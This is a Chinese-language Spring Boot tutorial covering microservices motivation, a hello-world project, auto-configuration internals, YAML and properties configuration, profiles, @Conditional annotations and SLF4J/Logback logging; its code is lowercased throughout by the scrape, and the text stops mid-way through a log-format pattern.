martinfowler.com\n\n微服务是当前项目开发的热点。回顾传统的单体应用开发，我们整个项目默认是部署在同一台服务器上的，我们将编写好的项目打成war包，放到tomcat中运行。在用户量较少、项目较为简单的场景下没有什么异常，部署起来也相对方便。但是如果项目的访问量较大，我们服务器的资源压力较大，单体应用就无法支撑起用户的需求。在这种情况下，我们通常会将项目部署在多个服务器上，然后使用负载均衡将用户的访问分配到不同的服务器上。那么，如果只是单个功能访问量较大，比如：订单功能、会员功能，这种方式就会导致服务器的资源浪费。微服务的思想应运而生。\n\n\n\n所谓微服务，就是将原本的单体应用抽离出多个功能模块，每个功能模块都可以单独部署。如果某个模块的访问要求较高，将不同模块之间的动态组合，部署到其他服务器上。每个功能模块都是可以独立替换和独立升级的单元。如下图所示：\n\n\n\n\n# helloworld\n\n# helloworld编写\n\n> 浏览器发送hello请求，服务器接收请求并将helloworld返回给浏览器。\n\n 1. 创建maven工程，并导入springboot相关依赖。\n    \n    <parent>\n        <groupid>org.springframework.boot</groupid>\n        <artifactid>spring-boot-starter-parent</artifactid>\n        <version>1.5.9.release</version>\n    </parent>\n    \n    <dependencies>\n        <dependency>\n            <groupid>org.springframework.boot</groupid>\n            <artifactid>spring-boot-starter-web</artifactid>\n        </dependency>\n    </dependencies>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    \n\n 2. 编写主程序，用于启动springboot应用\n    \n    package com.pwddd;\n    \n    import org.springframework.boot.springapplication;\n    import org.springframework.boot.autoconfigure.springbootapplication;\n    \n    @springbootapplication\n    public class springboottestapplication {\n        public static void main(string[] args) {\n            springapplication.run(springboottestapplication.class,args);\n        }\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    \n\n 3. 编写controller处理用户请求\n    \n    package com.pwddd.controller;\n    \n    import org.springframework.stereotype.controller;\n    import org.springframework.web.bind.annotation.getmapping;\n    import org.springframework.web.bind.annotation.responsebody;\n    \n    @controller\n    public class hellocontroller {\n    \n        @getmapping("/hello")\n        @responsebody\n        public string hello(){\n            return "helloworld";\n        }\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    \n\n 4. 运行主程序\n\n 5. springboot应用打包\n    \n    * 导入springboot项目插件\n      \n      <build>\n          <plugins>\n              <plugin>\n                  <groupid>org.springframework.boot</groupid>\n                  <artifactid>spring-boot-maven-plugin</artifactid>\n              </plugin>\n          </plugins>\n      </build>\n      \n      \n      1\n      2\n      3\n      4\n      5\n      6\n      7\n      8\n      \n    \n    * 运行maven -> package\n    \n    * java -jar运行\n\n# helloworld解析\n\n# 父项目版本仲裁\n\n在创建maven项目中，指定了maven的父项目。\n\n<parent>\n    <groupid>org.springframework.boot</groupid>\n    <artifactid>spring-boot-starter-parent</artifactid>\n    <version>1.5.9.release</version>\n</parent>\n\n\n1\n2\n3\n4\n5\n\n\n该父项目又指定了另一个父项目。\n\n<parent>\n    <groupid>org.springframework.boot</groupid>\n    <artifactid>spring-boot-dependencies</artifactid>\n    <version>1.5.9.release</version>\n    <relativepath>../../spring-boot-dependencies</relativepath>\n</parent>\n\n\n1\n2\n3\n4\n5\n6\n\n\n这个父项目中制定了相关组件的版本。\n\n<properties>\n    \x3c!-- dependency versions --\x3e\n    <activemq.version>5.14.5</activemq.version>\n    <antlr2.version>2.7.7</antlr2.version>\n    …………\n\n\n1\n2\n3\n4\n5\n\n\n# 场景启动器\n\nspringboot starter是springboot的场景启动器，帮我们导入了相关模块运行的相关依赖。springboot将常见的功能场景抽离出来，我们使用时只需要引用相关的场景启动器，springboot会帮我们自动导入相关的依赖。\n\n# springboot应用的启动\n\n在springboot启动类上有@springbootapplication注解，该注解说明了该类是当前项目的主配置类，springboot项目可以运行该类的main方法启动项目。该注解是一个组合注解，又包含了以下的内容。\n\n@target({elementtype.type})\n@retention(retentionpolicy.runtime)\n@documented\n@inherited\n@springbootconfiguration\n@enableautoconfiguration\n@componentscan(\n    excludefilters = {@filter(\n    type = filtertype.custom,\n    classes = {typeexcludefilter.class}\n), @filter(\n    type = filtertype.custom,\n    classes = {autoconfigurationexcludefilter.class}\n)}\n)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n@springbootconfiguration注解，标注springboot的配置类。\n\n@enableautoconfiguration注解，开启了自动配置的功能。之前在使用ssm框架时，需要自己导入相关的依赖和配置，开启自动配置之后就可以自动完成相关配置。\n\n在该注解中，包含了以下的注解内容：\n\n@target({elementtype.type})\n@retention(retentionpolicy.runtime)\n@documented\n@inherited\n@autoconfigurationpackage\n@import({enableautoconfigurationimportselector.class})\npublic @interface enableautoconfiguration {\n    string enabled_override_property = "spring.boot.enableautoconfiguration";\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n@autoconfigurationpackage: 自动配置包\n\n自动配置包由如下的注解组成：\n\n@target({elementtype.type})\n@retention(retentionpolicy.runtime)\n@documented\n@inherited\n@import({registrar.class})\npublic @interface autoconfigurationpackage {\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n@import({registrar.class}): import是spring底层的注解，该注解给容器中导入一个组件。导入组件由registrar定义。该类将application主配置类所在包下的所有子包中的组件添加扫描到spring容器中。\n\n public void registerbeandefinitions(annotationmetadata metadata, beandefinitionregistry registry) {\n            autoconfigurationpackages.register(registry, (new autoconfigurationpackages.packageimport(metadata)).getpackagename());\n        }\n\n\n1\n2\n3\n\n\nenableautoconfigurationimportselector：自动配置导入的选择器。将所有需要导入的组件以全类名的方式返回，这些组件就会被添加到容器中。\n\npublic string[] selectimports(annotationmetadata annotationmetadata) {\n    if (!this.isenabled(annotationmetadata)) {\n        return no_imports;\n    } else {\n        try {\n            autoconfigurationmetadata autoconfigurationmetadata = autoconfigurationmetadataloader.loadmetadata(this.beanclassloader);\n            annotationattributes attributes = this.getattributes(annotationmetadata);\n            list<string> configurations = this.getcandidateconfigurations(annotationmetadata, attributes);\n            configurations = this.removeduplicates(configurations);\n            configurations = this.sort(configurations, autoconfigurationmetadata);\n            set<string> exclusions = this.getexclusions(annotationmetadata, attributes);\n            this.checkexcludedclasses(configurations, exclusions);\n            configurations.removeall(exclusions);\n            configurations = this.filter(configurations, autoconfigurationmetadata);\n            this.fireautoconfigurationimportevents(configurations, exclusions);\n            return (string[])configurations.toarray(new string[configurations.size()]);\n        } catch (ioexception var6) {\n            throw new illegalstateexception(var6);\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n其中configuration中就包含了组件的全类名，由this.getcandidateconfigurations(annotationmetadata, attributes);方法获取，该方法中调用了springfactoriesloader.loadfactorynames。从配置文件中获取了全类名。\n\nenumeration<url> urls = classloader != null ? classloader.getresources("meta-inf/spring.factories") : classloader.getsystemresources("meta-inf/spring.factories");\n\n\n1\n\n\nspringboot在启动的时候从类路径下的meta-inf/spring.factories中获取enableautoconfiguration指定的值，将这些值作为自动配置类导入到容器中，自动配置类就生效，帮我们进行自动配置工作。\n\n\n# springboot配置文件\n\nspringboot中有两种类型的配置文件：application.properties和application.yml。\n\n配置文件的作用：springboot在底层做好了组件的基本配置，当我们想要自定义配置时，就需要定义配置文件。\n\n\n# yaml语法\n\n# 基本语法\n\nyaml是基于键值对的语法模式，使用空格完成层级的缩进，只要是对齐的空格数，就认为是同一层级的。yaml相对于xml配置文件，更加关注数据。基本样式如下：\n\nserver:\n  port: 8081\n\n\n1\n2\n\n\n# 值语法\n\n字面量：k: v字面量可以直接写，字符串默认不加单引号或者双引号。双引号不会转义字符串里面的特殊字符。而使用单引号会对特殊字符进行转义。\n\n对象、map：\n\n# 对象、map的写法\nfriends:\n\tlastname: zhangsan\n\tage: 20\n\t\n# 对象、map的行内写法\nfriends: {lastname: zhangsan,age: 18}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n数组：\n\n# 数组的写法\npets:\n - cat\n - dog\n - pig\n# 数组的行内写法\npets: [cat,dog,pig]\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 配置文件值导入javabean\n\njavabean\n\npackage com.pwddd.springboot.bean;\n\nimport org.springframework.beans.factory.annotation.value;\nimport org.springframework.boot.context.properties.configurationproperties;\nimport org.springframework.stereotype.component;\n\nimport java.util.list;\nimport java.util.map;\n\n@configurationproperties(prefix = "person")\n@component\npublic class person {\n\n    private string name;\n    private integer age;\n    private boolean boss;\n    private map<string,string> maps;\n    private list<string> lists;\n    private dog dog;\n\n    @override\n    public string tostring() {\n        return "person{" +\n                "name=\'" + name + \'\\\'\' +\n                ", age=" + age +\n                ", boss=" + boss +\n                ", maps=" + maps +\n                ", lists=" + lists +\n                ", dog=" + dog +\n                \'}\';\n    }\n\n    public string getname() {\n        return name;\n    }\n\n    public void setname(string name) {\n        this.name = name;\n    }\n\n    public integer getage() {\n        return age;\n    }\n\n    public void setage(integer age) {\n        this.age = age;\n    }\n\n    public boolean isboss() {\n        return boss;\n    }\n\n    public void setboss(boolean boss) {\n        this.boss = boss;\n    }\n\n    public map<string, string> getmaps() {\n        return maps;\n    }\n\n    public void setmaps(map<string, string> maps) {\n        this.maps = maps;\n    }\n\n    public list<string> getlists() {\n        return lists;\n    }\n\n    public void setlists(list<string> lists) {\n        this.lists = lists;\n    }\n\n    public dog getdog() {\n        return dog;\n    }\n\n    public void setdog(dog dog) {\n        this.dog = dog;\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n\n\npackage com.pwddd.bean;\n\npublic class dog {\n    private string name;\n    private integer age;\n\n    @override\n    public string tostring() {\n        return "dog{" +\n                "name=\'" + name + \'\\\'\' +\n                ", age=" + age +\n                \'}\';\n    }\n\n    public dog() {\n    }\n\n    public string getname() {\n        return name;\n    }\n\n    public void setname(string name) {\n        this.name = name;\n    }\n\n    public integer getage() {\n        return age;\n    }\n\n    public void setage(integer age) {\n        this.age = age;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n添加配置处理器，用来提示配置文件\n\n<dependency>\n    <groupid>org.springframework.boot</groupid>\n    <artifactid>spring-boot-configuration-processor</artifactid>\n    <optional>true</optional>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\n编写配置文件\n\nperson:\n  name: zhangsan\n  age: 12\n  maps: {zhangsan: aaa,lisi: bbb}\n  lists:\n    - zhangsan\n    - lisi\n  dog:\n    name: zhangsan\n    age: 12\n\t\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n编写测试\n\n@springboottest\nclass springbootapplicationtests {\n\n    @autowired\n    person person;\n\n    @test\n    public void testproperties(){\n        system.out.println(person);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 其他获取值的方法\n\n//@configurationproperties(prefix = "person")\n@component\npublic class person {\n\n    private string name;\n    @value("${person.age}")\n    private integer age;\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nconfigurationproperties和value的区别：\n\n             @configurationproperties   @value\n功能           批量注入配置文件中的属性               一个个指定\n松散绑定（松散语法）   支持                         不支持\nspel         不支持                        支持\njsr303数据校验   支持                         不支持\n复杂类型封装       支持                         不支持\n\n如果说，我们只是在某个业务逻辑中需要获取一下配置文件中的某项值，使用@value。如果说，我们专门编写了一个javabean来和配置文件进行映射，我们就直接使用@configurationproperties。\n\n\n# 配置文件注入值数据校验\n\n@component\n@configurationproperties(prefix = "person")\n@validated\npublic class person {\n/**\n* <bean class="person">\n* <property name="lastname" value="字面量/${key}从环境变量、配置文件中获取值/#\n{spel}"></property>\n* <bean/>\n*/\n//lastname必须是邮箱格式\n@email\n//@value("${person.last‐name}")\nprivate string lastname;\n//@value("#{11*2}")\nprivate integer age;\n//@value("true")\nprivate boolean boss;\nprivate date birth;\nprivate map<string,object> maps;\nprivate list<object> lists;\nprivate dog dog;\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n\n# @propertiesource\n\n@propertiesource:加载指定的配置文件。默认从全局配置文件中加载配置，如果需要指定其他的配置文件的位置，就可以使用该注解。\n\n@importresource：导入spring的配置文件，让配置文件里面的内容生效。springboot里面没有spring的配置文件，我们自己编写的配置文件，也不能自动识别。想让spring的配置文件生效，加载进来。\n\n@importresource(locations = {"classpath:beans.xml"})\n//导入spring的配置文件让其生效\n\n\n1\n2\n\n\nspringboot推荐给容器中添加组件的方式，推荐使用全注解的方式。\n\n 1. 配置类添加@configuration注解，指明当前类是一个配置类。\n\n 2. 使用@bean给容器中添加组件\n\npackage com.pwddd.springboot.config;\n\nimport org.springframework.context.annotation.configuration;\n\n@configuration\npublic class myappconfig {\n//将方法的返回值添加到容器中；容器中这个组件默认的id就是方法名\n    \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# 配置文件占位符\n\n# 随机数\n\n${random.value}、${random.int}、${random.long}\n${random.int(10)}、${random.int[1024,65536]}\n\n\n1\n2\n\n\n# 占位符获取配置值\n\nperson.last‐name=张三${random.uuid}\nperson.age=${random.int}\nperson.birth=2017/12/15\nperson.boss=false\nperson.maps.k1=v1\nperson.maps.k2=14\nperson.lists=a,b,c\nperson.dog.name=${person.hello:hello}_dog\nperson.dog.age=15\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# profile多环境支持\n\n我们在主配置文件编写的时候，文件名可以是 application-{profile}.properties/yml。\n\n默认使用application.properties的配置。当我们需要激活指定的配置文件时，可以在主配置文件中指定：spring.profiles.active=dev或者使用命令行方式java -jar spring-boot-02-config-0.0.1-snapshot.jar --spring.profiles.active=dev，或者使用虚拟机方式-dspring.profiles.active=dev。\n\n\n# yml多文档块模式\n\nserver:\n port: 8081\n spring:\n profiles:\n active: prod\n‐‐‐\nserver:\n port: 8083\n spring:\n profiles: dev\n‐‐‐\nserver:\n port: 8084\n spring:\n profiles: prod #指定属于哪个环境\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# 配置文件的加载\n\nspringboot启动会扫描以下位置的application.properties或者application.yml文件作为springboot的默认配置文件。\n\n–file:./config/  当前项目的config目录\n–file:./\n–classpath:/config/\n–classpath:/\n\n\n1\n2\n3\n4\n\n\n优先级由高到底，高优先级的配置会覆盖低优先级的配置。只要以上的配置文件存在springboot就会加载，形成配置文件的互补。\n\n我们还可以通过spring.config.location来改变默认的配置文件位置(使用命令行参数的方式)：\n\njava -jar spring-boot-02-config-0.0.1-snapshot.jar --spring.profiles.active=dev --spring.config.location=xxx\n\n\n1\n\n\n这个配置文件的位置会和其他位置上的配置文件共同加载。\n\nspringboot也可以从以下位置加载配置，优先级从高到低，高优先级的配置覆盖低优先级的配置，所有的配置会 形成互补配置。\n\n 1.  命令行参数\n 2.  来自java:comp/env的jndi属性\n 3.  java系统属性（system.getproperties()）\n 4.  操作系统环境变量\n 5.  randomvaluepropertysource配置的random.*属性值\n 6.  jar包外部的application-{profile}.properties或application.yml(带spring.profile)配置文件\n 7.  jar包内部的application-{profile}.properties或application.yml(带spring.profile)配置文件\n 8.  jar包外部的application.properties或application.yml(不带spring.profile)配置文件\n 9.  jar包内部的application.properties或application.yml(不带spring.profile)配置文件\n 10. @configuration注解类上的@propertysource\n 11. 通过springapplication.setdefaultproperties指定的默认属性\n\n\n# 自动配置原理\n\n配置文件能够配置的属性可以参考：springboot配置文件\n\n 1.  springboot启动类上有一个注解@springbootapplication，该注解是一个组合注解\n     \n     @target({elementtype.type})\n     @retention(retentionpolicy.runtime)\n     @documented\n     @inherited\n     @springbootconfiguration\n     @enableautoconfiguration\n     @componentscan(\n         excludefilters = {@filter(\n         type = filtertype.custom,\n         classes = {typeexcludefilter.class}\n     ), @filter(\n         type = filtertype.custom,\n         classes = {autoconfigurationexcludefilter.class}\n     )}\n     )\n     public @interface springbootapplication {\n     \n     \n     1\n     2\n     3\n     4\n     5\n     6\n     7\n     8\n     9\n     10\n     11\n     12\n     13\n     14\n     15\n     16\n     \n\n 2.  其中有一个@enableautoconfiguration，该注解就是实现自动配置有关的注解。\n     \n     @target({elementtype.type})\n     @retention(retentionpolicy.runtime)\n     @documented\n     @inherited\n     @autoconfigurationpackage\n     @import({autoconfigurationimportselector.class})\n     public @interface enableautoconfiguration {\n     \n     \n     1\n     2\n     3\n     4\n     5\n     6\n     7\n     \n\n 3.  其中@import导入了一个自动配置导入选择器，在该选择器中，有一个方法，将所有的自动配置全类名保存到一个configurations中。\n     \n         protected autoconfigurationimportselector.autoconfigurationentry getautoconfigurationentry(annotationmetadata annotationmetadata) {\n             if (!this.isenabled(annotationmetadata)) {\n                 return empty_entry;\n             } else {\n                 annotationattributes attributes = this.getattributes(annotationmetadata);\n                 list<string> configurations = this.getcandidateconfigurations(annotationmetadata, attributes);\n                 configurations = this.removeduplicates(configurations);\n                 set<string> exclusions = this.getexclusions(annotationmetadata, attributes);\n                 this.checkexcludedclasses(configurations, exclusions);\n                 configurations.removeall(exclusions);\n                 configurations = this.getconfigurationclassfilter().filter(configurations);\n                 this.fireautoconfigurationimportevents(configurations, exclusions);\n                 return new autoconfigurationimportselector.autoconfigurationentry(configurations, exclusions);\n             }\n         }\n     \n     \n     1\n     2\n     3\n     4\n     5\n     6\n     7\n     8\n     9\n     10\n     11\n     12\n     13\n     14\n     15\n     \n\n 4.  获取configuration的方法是getcandidateconfigurations。\n     \n         protected list<string> getcandidateconfigurations(annotationmetadata metadata, annotationattributes attributes) {\n             list<string> configurations = springfactoriesloader.loadfactorynames(this.getspringfactoriesloaderfactoryclass(), this.getbeanclassloader());\n             assert.notempty(configurations, "no auto configuration classes found in meta-inf/spring.factories. if you are using a custom packaging, make sure that file is correct.");\n             return configurations;\n         }\n     \n     \n     1\n     2\n     3\n     4\n     5\n     \n\n 5.  该方法中调用了springfactoriesloader中的loadfactorynames获取到了所有的配置文件中配置的auto configuration全类名。\n     \n     enumeration urls = classloader.getresources("meta-inf/spring.factories");\n     \n     \n     1\n     \n\n 6.  该方法扫描所有jar包下的meta-inf/spring.factories，把扫描到的这些文件的内容包装成properties对象，从properties中获取到enableautoconfiguration.class类(类名)对应的值，然后把他们添加在容器中。\n\n 7.  每一个这样的xxxautoconfiguration类都是容器中的一个组件，都加入到容器中，用他们来做自动配置。\n\n 8.  以httpencodingautoconfiguration（http编码自动配置）为例解释自动配置原理。\n     \n     @configuration(\n         proxybeanmethods = false\n     )  // //表示这是一个配置类，以前编写的配置文件一样，也可以给容器中添加组件\n     @enableconfigurationproperties({serverproperties.class})  ////启动指定类的configurationproperties功能；将配置文件中对应的值和serverproperties绑定起来；并把serverproperties加入到ioc容器中\n     \n     @conditionalonwebapplication(\n         type = type.servlet\n     )  // n //spring底层@conditional注解（spring注解版），根据不同的条件，如果满足指定的条件，整个配置类里面的配置就会生效； 判断当前应用是否是web应用，如果是，当前配置类生效\n     \n     @conditionalonclass({characterencodingfilter.class})  //判断当前项目有没有这个类, characterencodingfilter；springmvc中进行乱码解决的过滤器；\n     \n     @conditionalonproperty(\n         prefix = "server.servlet.encoding",\n         value = {"enabled"},\n         matchifmissing = true\n     ) // //判断配置文件中是否存在某个配置 server.servlet.encoding；如果不存在，判断也是成立的\n     //即使我们配置文件中不配置server.servlet.encoding=true，也是默认生效的；\n     public class httpencodingautoconfiguration {\n         \n         // 和encoding做映射，encoding类中配置对应的相关配置文件的内容，加上上面的前缀。\n         private final encoding properties;\n     \n         //只有一个有参构造器的情况下，参数的值就会从容器中拿\n         public httpencodingautoconfiguration(serverproperties properties) {\n             this.properties = properties.getservlet().getencoding();\n         }\n     \n         @bean  ////给容器中添加一个组件，这个组件的某些值需要从properties中获取\n         @conditionalonmissingbean  //判断容器没有这个组件？\n         public characterencodingfilter characterencodingfilter() {\n             characterencodingfilter filter = new orderedcharacterencodingfilter();\n             filter.setencoding(this.properties.getcharset().name());\n             filter.setforcerequestencoding(this.properties.shouldforce(org.springframework.boot.web.servlet.server.encoding.type.request));\n             filter.setforceresponseencoding(this.properties.shouldforce(org.springframework.boot.web.servlet.server.encoding.type.response));\n             return filter;\n         }\n     \n     \n     1\n     2\n     3\n     4\n     5\n     6\n     7\n     8\n     9\n     10\n     11\n     12\n     13\n     14\n     15\n     16\n     17\n     18\n     19\n     20\n     21\n     22\n     23\n     24\n     25\n     26\n     27\n     28\n     29\n     30\n     31\n     32\n     33\n     34\n     35\n     36\n     \n\n 9.  根据当前不同的条件判断，决定这个配置类是否生效。一但这个配置类生效，这个配置类就会给容器中添加各种组件，这些组件的属性是从对应的properties类中获取的，这些类里面的每一个属性又是和配置文件绑定的。\n\n 10. 所有在配置文件中能配置的属性都是在xxxxproperties类中封装的，配置文件能配置什么就可以参照某个功能对应的这个属性类。\n     \n     public class encoding {\n         public static final charset default_charset;\n         private charset charset;\n         private boolean force;\n         private boolean forcerequest;\n         private boolean forceresponse;\n         private map<locale, charset> mapping;\n     \n     \n     1\n     2\n     3\n     4\n     5\n     6\n     7\n     \n\n\n# springboot的精髓\n\n * springboot启动会加载大量的自动配置类\n * 我们看我们需要的功能有没有springboot默认写好的自动配置类\n * 我们再来看这个自动配置类中到底配置了哪些组件（只要我们要用的组件有，我们就不需要再来配置了）\n * 给容器中自动配置类添加组件的时候，会从properties类中获取某些属性。我们就可以在配置文件中指定这些属性的值。\n\n\n# @conditional派生注解\n\n作用：对生效条件进行判断，必须是@conditional指定的条件成立，才给容器中添加组件，配置配里面的所有内容才生效。\n\n@conditional扩展注解                  作用（判断是否满足当前指定条件）\n@conditionalonjava                系统的java版本是否符合要求\n@conditionalonbean                容器中存在指定bean\n@conditionalonmissingbean         容器中不存在指定bean\n@conditionalonexpression          满足spel表达式指定\n@conditionalonclass               系统中有指定的类\n@conditionalonmissingclass        系统中没有指定的类\n@conditionalonsinglecandidate     容器中只有一个指定的bean，或者这个bean是首选bean\n@conditionalonproperty            系统中指定的属性是否有指定的值\n@conditionalonresource            类路径下是否存在指定资源文件\n@conditionalonwebapplication      当前是web环境\n@conditionalonnotwebapplication   当前不是web环境\n@conditionalonjndi                jndi存在指定项\n\n因此，我们自动配置类需要在该类满足配置以上注解的条件下才能使用，我们可以在配置文件中开启debug模式，该模式可以打印自动配置报告，在该报告中标明了哪些类生效，哪些类不生效。\n\n\n============================\nconditions evaluation report\n============================\n\n\npositive matches:\n-----------------\n\n   aopautoconfiguration matched:\n      - @conditionalonproperty (spring.aop.auto=true) matched (onpropertycondition)\n\n   aopautoconfiguration.classproxyingconfiguration matched:\n      - @conditionalonmissingclass did not find unwanted class \'org.aspectj.weaver.advice\' (onclasscondition)\n      - @conditionalonproperty (spring.aop.proxy-target-class=true) matched (onpropertycondition)\n\n   dispatcherservletautoconfiguration matched:\n      - @conditionalonclass found required class \'org.springframework.web.servlet.dispatcherservlet\' (onclasscondition)\n      - found \'session\' scope (onwebapplicationcondition)\n\n   dispatcherservletautoconfiguration.dispatcherservletconfiguration matched:\n      - @conditionalonclass found required class \'javax.servlet.servletregistration\' (onclasscondition)\n      - default dispatcherservlet did not find dispatcher servlet beans (dispatcherservletautoconfiguration.defaultdispatcherservletcondition)\n\n   dispatcherservletautoconfiguration.dispatcherservletregistrationconfiguration matched:\n      - @conditionalonclass found required class \'javax.servlet.servletregistration\' (onclasscondition)\n      - dispatcherservlet registration did not find servlet registration bean (dispatcherservletautoconfiguration.dispatcherservletregistrationcondition)\n\n……………………\n\nnegative matches:\n-----------------\n\n   activemqautoconfiguration:\n      did not match:\n         - @conditionalonclass did not find required class \'javax.jms.connectionfactory\' (onclasscondition)\n\n   aopautoconfiguration.aspectjautoproxyingconfiguration:\n      did not match:\n         - @conditionalonclass did not find required class \'org.aspectj.weaver.advice\' (onclasscondition)\n\n …………………\n\nexclusions:\n-----------\n\n    none\n\n\nunconditional classes:\n----------------------\n\n    org.springframework.boot.autoconfigure.context.configurationpropertiesautoconfiguration\n\n    org.springframework.boot.autoconfigure.context.lifecycleautoconfiguration\n\n    org.springframework.boot.autoconfigure.context.propertyplaceholderautoconfiguration\n\n    org.springframework.boot.autoconfigure.availability.applicationavailabilityautoconfiguration\n\n    org.springframework.boot.autoconfigure.info.projectinfoautoconfiguration\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n\n\n\n# 日志\n\n场景：小张在开发一个大型的系统，在系统中为了调试方便，小张使用system.out.print打印了一些调试信息。有一天，领导说想要将打印的信息移除掉，虽然很困难，小张还是将自己写的system.out一行一行的删掉了。删除之后，领导说小张写的调试输出还是很有用的，想要重新加上，并且最好能够输出到一个文件中去。于是小张写了一个日志的框架zhanglogging.jar，调用框架中的api打印日志并且输出到文件中。过了一段时间，小张想给他的框架中添加一些功能，于是写了一个zhanglogging-better.jar。那么怎么替换项目中的日志框架呢？还需要重新将使用过日志的地方替换为新的日志框架。小张想到了jdbc，jdbc提供了一个数据库的连接器，后面的实现用的不同的具体实现的jar。于是小张写了一个日志的抽象层，项目中引用了日志的抽象层，然后具体的日志jar实现了抽象层。下次如果更新就可以直接替换具体的实现就好了。\n\n主流的日志框架：jul、jcl、jboss-logging、logback、log4j、log4j2、slf4j……\n\n但是这些框架并不都是日志的具体实现。\n\n日志门面 （日志的抽象层）                                                  日志实现\njcl（jakarta commons logging）、slf4j（simple logging facade for   log4j 、jul（java.util.logging） 、log4j2 、logback\njava） 、jboss-logging\n\n我们在项目中最好是使用日志的抽象层，然后选择一个具体的实现。这样在切换日志框架时就只需要替换掉日志的具体实现就好了。其中log4j、logback和slf4j是同一个作者研发的。slf4j是抽象层（门面）,logback是log4j的功能升级版。\n\nspringboot默认选用的日志框架是slf4j和logback的组合，而spring默认使用的是jcl。\n\n\n# slf4j的使用方法\n\nslf4j官网\n\n以后开发的时候，日志记录方法的调用不应该来直接调用日志的实现类，而是调用日志抽象层里面的方法。并且给系统里面导入slf4j的jar和 logback的实现jar。\n\nimport org.slf4j.logger;\nimport org.slf4j.loggerfactory;\npublic class helloworld {\n    public static void main(string[] args) {\n        logger logger = loggerfactory.getlogger(helloworld.class);\n        logger.info("hello world");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n\n每一个日志的实现框架都有自己的配置文件。使用slf4j以后，配置文件还是做成日志实现框架自己本身的配置文件。\n\n\n# 日志的统一\n\n在项目中，不同的组件可能使用的不同的日志框架。那么我们怎么使用统一的log4j框架呢？\n\n\n\n我们需要将所有的日志框架都统统一到slf4j+logback的组合：\n\n 1. 去除之前项目中的日志框架\n 2. 添加xxx-over-slf4j.jar，这个jar包内部的包名是原来的日志框架，具体实现是调用slf4j的api，然后再由slf4j调用具体的日志实现框架。\n 3. 导入slf4j的其他实现。\n\n\n# springboot的日志关系\n\n每个springboot场景启动器中都会包含一个springboot的启动器。\n\n<dependency>\n    <groupid>org.springframework.boot</groupid>\n    <artifactid>spring‐boot‐starter</artifactid>\n</dependency>\n\n\n\n1\n2\n3\n4\n5\n\n\n该启动器中又包含了一个日志的启动器\n\n<dependency>\n    <groupid>org.springframework.boot</groupid>\n    <artifactid>spring‐boot‐starter</artifactid>\n</dependency>\n\n\n\n1\n2\n3\n4\n5\n\n\n底层的依赖关系：\n\n\n\n如果需要引入其他框架，首先就需要将该框架的日志包排除出去，然后使用xxx-over-slf4j.jar，统一到slf4j上。\n\n<dependency>\n    <groupid>org.springframework</groupid>\n    <artifactid>spring‐core</artifactid>\n    <exclusions>\n        <exclusion>\n            <groupid>commons‐logging</groupid>\n            <artifactid>commons‐logging</artifactid>\n        </exclusion>\n    </exclusions>\n</dependency>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 日志的使用方法\n\n//记录器\nlogger logger = loggerfactory.getlogger(getclass());\n@test\npublic void contextloads() {\n    //system.out.println();\n    //日志的级别；\n    //由低到高 trace<debug<info<warn<error\n    //可以调整输出的日志级别；日志就只会在这个级别以以后的高级别生效\n    logger.trace("这是trace日志...");\n    logger.debug("这是debug日志...");\n    //springboot默认给我们使用的是info级别的，没有指定级别的就用springboot默认规定的级别；root\n    级别\n        logger.info("这是info日志...");\n    logger.warn("这是warn日志...");\n    logger.error("这是error日志...");\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n日志输出的格式设置：\n\n日志输出格式：\n%d表示日期时间，\n%thread表示线程名，\n%‐5level：级别从左显示5个字符宽度\n%logger{50} 表示logger名字最长50个字符，否则按照句点分割。\n%msg：日志消息，\n%n是换行符\n%d{yyyy‐mm‐dd hh:mm:ss.sss} [%thread] %‐5level %logger{50} ‐ 